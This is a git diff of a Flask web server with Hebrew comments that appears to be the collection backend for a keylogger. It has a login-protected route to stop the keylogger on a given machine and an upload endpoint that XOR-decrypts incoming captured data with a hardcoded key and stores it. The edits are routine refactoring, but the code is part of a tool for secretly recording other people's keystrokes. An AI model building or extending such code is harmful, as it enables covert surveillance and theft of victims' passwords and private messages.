@@ -4,7 +4,7 @@ import os
 import json
 import time
 from flask_cors import CORS
-import dc_Encryptor
+import Encryptor
 import flask_login
 from flask import Flask, render_template, request, redirect, url_for, jsonify
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
@@ -95,6 +95,9 @@ def show_folder_contents(folder_name):
     # מחזיר את המידע לתבנית ה-HTML
     return render_template('folder_contents.html', folder_name=folder_name, available_dates=available_dates)
 
+
+
+# @app.route('')
 @app.route('/folders/<folder_name>/<from_date>/<last_date>', methods=['GET'])
 @login_required
 def collect_content_between_files_in_folder( folder_name, from_date, last_date):
@@ -252,10 +255,10 @@ def process_raw_json_data(raw_data):
         print(f"שגיאה בהמרת הנתונים: {e}")
         return {}
 
-@app.route('/<mac_address>/stop', methods=['GET'])
+@app.route('/folders/<folder_name>/stop', methods=['GET'])
 @login_required
-def stop_keylogger(mac_address):
-    stop_by_mac_address(mac_address)
+def stop_keylogger(folder_name):
+    stop_by_mac_address(folder_name)
     response = {"message": "stop in the next messege to the server:111"}
     return flask.jsonify(response),200
 
@@ -273,9 +276,9 @@ def upload_data():
         if not new_data:
             if chek_if_stop_by_mac_address(new_data):
                 return flask.jsonify({'error': "No data received"}), 400
-
         # הצפנה אם צריך
-        decrypted_data = dc_Encryptor.Encryptor.xor_decryption(new_data, "aaa")
+        decryption = Encryptor.XOREncryptor()
+        decrypted_data = decryption.decryption(new_data,"abc")
 
         # שמירת הנתונים
         save_new_data(decrypted_data)
